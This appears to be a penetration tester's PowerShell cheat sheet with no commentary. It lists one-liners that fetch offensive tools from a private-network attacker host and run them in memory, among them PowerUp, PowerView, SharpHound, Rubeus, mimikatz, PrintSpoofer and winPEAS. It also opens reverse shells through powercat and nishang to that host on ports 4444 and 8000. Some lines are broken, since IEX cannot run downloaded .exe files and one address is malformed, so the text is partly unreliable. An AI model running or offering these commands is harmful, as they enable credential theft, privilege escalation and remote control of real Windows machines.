```Powershell
IEX (New-Object Net.Webclient).DownloadString("http://192.168.49.115/powerup.ps1"); Invoke-AllChecks

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/PowerView.ps1")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/SharpHound.ps1")

IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.115/powercat.ps1');powercat -c 192.168.45.115 -p 4444 -e powershell

IEX(New-Object Net.WebClient).DownloadString('http://192.168.45.115/nishang.psm1');Invoke-PowerShellTcp -Reverse -IPAddress 192.168.45.115X -Port 8000

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/Rubeus.exe")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/mimikatz.exe")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/Sharphound.exe")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/InstallUtilFLM.exe")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/SpoolSample.exe")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.247:8000/printspoofer.exe")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/esc.exe")

IEX (New-Object Net.Webclient).DownloadString("http://192.168.45.115/winPEAS.exe")


iwr -uri http://192.168.49.115/
```